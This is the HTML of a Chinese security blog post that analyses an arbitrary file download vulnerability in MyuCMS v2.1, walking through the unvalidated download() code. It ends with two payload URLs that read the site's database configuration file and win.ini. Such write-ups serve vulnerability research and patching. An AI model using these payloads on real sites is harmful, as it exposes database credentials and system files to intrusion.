@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MyuCMS v2.1 前台任意文件下载一、漏洞简介二、漏洞影响MyuCMS v2.1 三、复现过程既然是文件下载，先在整个项目中搜索下 download关键字，尝试看看能不能直接定位到关键代码。 通过搜索定位到 bbs 模块下的 Index 控制器的 download 方法。  download 方法接受三个参数，这三个参数我们是完全可控的，单从download 这个方法来看，无任何参数内容限制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="MyuCMS v2.1 前台任意文件下载一、漏洞简介二、漏洞影响MyuCMS v2.1 三、复现过程既然是文件下载，先在整个项目中搜索下 download关键字，尝试看看能不能直接定位到关键代码。 通过搜索定位到 bbs 模块下的 Index 控制器的 download 方法。  download 方法接受三个参数，这三个参数我们是完全可控的，单从download 这个方法来看，无任何参数内容限制">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MyuCMSv2.1%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId24.jpg">
+<meta property="article:published_time" content="2022-07-08T06:25:59.989Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.670Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/MyuCMSv2.1%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId24.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-MyuCMS/MyuCMS v2.1 前台任意文件下载" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.989Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MyuCMS-v2-1-前台任意文件下载"><a href="#MyuCMS-v2-1-前台任意文件下载" class="headerlink" title="MyuCMS v2.1 前台任意文件下载"></a>MyuCMS v2.1 前台任意文件下载</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>既然是文件下载，先在整个项目中搜索下 <strong>download</strong><br>关键字，尝试看看能不能直接定位到关键代码。</p>
+<p>通过搜索定位到 <strong>bbs</strong> 模块下的 <strong>Index</strong> 控制器的 <strong>download</strong> 方法。</p>
+<p><a target="_blank" rel="noopener" href="https://pic.downk.cc/item/5e4266e52fb38b8c3c9e7e3d.jpg"><img src="/resource/MyuCMSv2.1%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId24.jpg" alt="img"></a></p>
+<p><strong>download</strong> 方法接受三个参数，这三个参数我们是完全可控的，单从<br><strong>download</strong> 这个方法来看，无任何参数内容限制，直接将 <strong>$url</strong> 和<br><strong>$name</strong> 两个参数传递给了 <strong>Http</strong> 类的 <strong>download</strong> 方法来执行下载。</p>
+<p>若 <strong>Http-&gt;download()</strong><br>方法中还未对参数内容进行限制，便会造成任意文件下载漏洞。</p>
+<p>接下来，我们跟进 <strong>Http-&gt;download()</strong> 方法。</p>
+<pre><code>static public function download ($filename, $showname=&#39;&#39;,$content=&#39;&#39;,$expire=180) &#123;
+        if(is_file($filename)) &#123; //判断 $filename 是否为文件
+            $length = filesize($filename); // 获取 $filename 的文件大小
+        &#125;elseif($content != &#39;&#39;) &#123;
+            $length = strlen($content);
+        &#125;else &#123;
+            throw_exception($filename.L(&#39;下载文件不存在！&#39;)); // 若文件不存在抛出异常
+        &#125;
+        if(empty($showname)) &#123;
+            $showname = $filename; // $showname 为下载后文件的名称。若未设置则与被下载文件同名
+        &#125;
+        $showname = basename($showname); //获取路径中的文件名部分
+        if(!empty($filename)) &#123;
+            $type = mime_content_type($filename); //获取文件的MIME类型
+        &#125;else&#123;
+            $type    =   &quot;application/octet-stream&quot;;
+        &#125;
+        //发送Http Header信息 开始下载
+        header(&quot;Pragma: public&quot;);
+        header(&quot;Cache-control: max-age=&quot;.$expire);
+        //header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);
+        header(&quot;Expires: &quot; . gmdate(&quot;D, d M Y H:i:s&quot;,time()+$expire) . &quot;GMT&quot;);
+        header(&quot;Last-Modified: &quot; . gmdate(&quot;D, d M Y H:i:s&quot;,time()) . &quot;GMT&quot;);
+        header(&quot;Content-Disposition: attachment; filename=&quot;.$showname);
+        header(&quot;Content-Length: &quot;.$length);
+        header(&quot;Content-type: &quot;.$type);
+        header(&#39;Content-Encoding: none&#39;);
+        header(&quot;Content-Transfer-Encoding: binary&quot; );
+        if($content == &#39;&#39; ) &#123;
+            readfile($filename); // 读取文件内容并输出，从而实现下载
+        &#125;else &#123;
+            echo($content);
+        &#125;
+        exit();
+    &#125;
+</code></pre>
+<p>由如上代码我们可以看出，<strong>Http-&gt;download()</strong><br>方法中同样<strong>未对传入的参数进行内容限制</strong>，只实现了下载的业务逻辑。</p>
+<p>此处任意文件下载，结合 phar<br>反序列化，还可以造成任意文件删除和任意文件写入（仅linux下）。</p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><pre><code>Payload: http://www.0-sec.org/bbs/index/download?url=application/database.php&amp;name=&amp;local=1
+
+Payload: http://www.0-sec.org/bbs/index/download?url=c:/windows/win.ini&amp;name=&amp;local=1
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7271/#toc-0">https://xz.aliyun.com/t/7271\#toc-0</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-id="cl5c2qsqv00bxy8v14av09tlj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
